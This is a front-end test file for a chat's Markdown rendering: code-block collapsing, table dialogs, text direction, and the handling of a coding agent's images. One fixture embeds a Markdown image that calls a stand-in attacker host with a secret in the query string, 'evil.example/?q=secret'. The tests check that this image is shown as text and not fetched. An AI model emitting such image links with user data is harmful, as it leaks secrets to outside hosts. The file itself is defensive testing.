// @vitest-environment jsdom

/**
 * The chat's Streamdown overrides (`@neore/ui/components/chat-markdown-components`):
 * the 24-line code cap with its expand toggle, the appearance switch that turns
 * it off, and the table enlarge dialog. Asserted through roles and text only.
 */

import { chatMarkdownComponents, hostMarkdownComponents } from "@neore/ui/components/chat-markdown-components";
import { DEFAULT_STREAMDOWN_APPEARANCE, setStreamdownAppearance } from "@neore/ui/hooks/use-streamdown-appearance";
import { act, fireEvent, render, screen } from "@testing-library/react";
import { Streamdown } from "streamdown";
import { beforeEach, describe, expect, it, vi } from "vitest";

// Unit tests do not compile the Lingui macros; the overrides call `useLingui`.
vi.mock("@lingui/react/macro", () => {
    return {
        useLingui: () => {
            return {
                t: (strings: TemplateStringsArray | string, ...values: unknown[]) =>
                    typeof strings === "string" ? strings : String.raw({ raw: strings }, ...values),
            };
        },
    };
});

const settle = async () => {
    // Lets Streamdown's lazily loaded highlighter resolve.
    await act(async () => {
        await new Promise<void>((resolve) => {
            setTimeout(resolve, 0);
        });
    });
};

const renderChat = async (markdown: string) => {
    render(
        <Streamdown codeBlockMaxHeight="none" components={chatMarkdownComponents} lineNumbers={false}>
            {markdown}
        </Streamdown>,
    );

    await settle();
};

const fence = (lines: number) => `\`\`\`ts\n${Array.from({ length: lines }, (_, index) => `const line${index} = ${index};`).join("\n")}\n\`\`\``;

describe("chat code blocks", () => {
    beforeEach(() => {
        setStreamdownAppearance(DEFAULT_STREAMDOWN_APPEARANCE);
    });

    it("offers an expand toggle for a block taller than 24 lines", async () => {
        await renderChat(fence(30));

        const toggle = screen.getByRole("button", { name: "Show all 30 lines" });

        expect(toggle.getAttribute("aria-expanded")).toBe("false");

        fireEvent.click(toggle);
        await settle();

        expect(screen.getByRole("button", { name: "Show less" }).getAttribute("aria-expanded")).toBe("true");
    });

    it("leaves a block of 24 lines or fewer alone", async () => {
        await renderChat(fence(24));

        expect(screen.getByText("const line0 = 0;")).toBeDefined();
        expect(screen.queryByRole("button", { name: "Show all 24 lines" })).toBeNull();
    });

    it("does not offer the toggle when the appearance turns the cap off", async () => {
        setStreamdownAppearance({ ...DEFAULT_STREAMDOWN_APPEARANCE, capLongCodeBlocks: false });
        await renderChat(fence(40));

        expect(screen.getByText("const line39 = 39;")).toBeDefined();
        expect(screen.queryByRole("button", { name: "Show all 40 lines" })).toBeNull();
    });
});

describe("chat tables", () => {
    it("opens the table in a dialog that keeps the cells", async () => {
        await renderChat("| Name | Qty |\n| --- | --- |\n| apple | 2 |");

        expect(screen.getByRole("table")).toBeDefined();
        // Streamdown's copy and download dropdowns still render in the replacement wrapper.
        expect(screen.getByTitle("Copy table")).toBeDefined();
        expect(screen.getByTitle("Download table")).toBeDefined();

        fireEvent.click(screen.getByRole("button", { name: "Enlarge table" }));
        await settle();

        expect(screen.getByRole("dialog").textContent).toContain("apple");
    });
});

describe("chat text direction", () => {
    it("lets each block pick its direction from its own text", async () => {
        await renderChat("# عنوان\n\nHello there\n\nשלום עולם\n\n- one\n- two\n\n> quoted");

        expect(screen.getByRole("heading").getAttribute("dir")).toBe("auto");
        expect(screen.getByText("Hello there").getAttribute("dir")).toBe("auto");
        expect(screen.getByText("שלום עולם").getAttribute("dir")).toBe("auto");
        expect(screen.getByRole("list").getAttribute("dir")).toBe("auto");
        expect(screen.getByRole("blockquote").getAttribute("dir")).toBe("auto");
    });

    it("leaves code blocks alone", async () => {
        await renderChat(fence(2));

        const code = screen.queryByRole("code");

        expect(code?.getAttribute("dir") ?? null).toBeNull();
    });
});

/* eslint-disable testing-library/no-container, testing-library/no-node-access, testing-library/render-result-naming-convention -- these assert on the raw DOM: an image with an empty alt has no role to query by */
describe("a coding agent's Markdown images", () => {
    const reply = "A chart ![chart](out/chart.png) and a pixel ![](https://evil.example/?q=secret).";

    const renderWith = async (components: typeof chatMarkdownComponents) => {
        const { container } = render(
            <Streamdown codeBlockMaxHeight="none" components={components} lineNumbers={false}>
                {reply}
            </Streamdown>,
        );

        await settle();

        return container;
    };

    it("are shown as the Markdown they are, and no image element is created to fetch anything", async () => {
        const container = await renderWith(hostMarkdownComponents);

        expect(container.querySelector("img")).toBeNull();
        // A path is blocked by Streamdown itself; a remote address is shown by ours, so it is never fetched.
        expect(container.textContent).toContain("chart");
        expect(container.textContent).toContain("![](https://evil.example/?q=secret)");
    });

    it("are still loaded in an ordinary reply, which is why a host's reply gets the other renderer", async () => {
        const container = await renderWith(chatMarkdownComponents);

        expect(container.querySelector("img[src^='https://evil.example']")).not.toBeNull();
    });
});
/* eslint-enable testing-library/no-container, testing-library/no-node-access, testing-library/render-result-naming-convention */
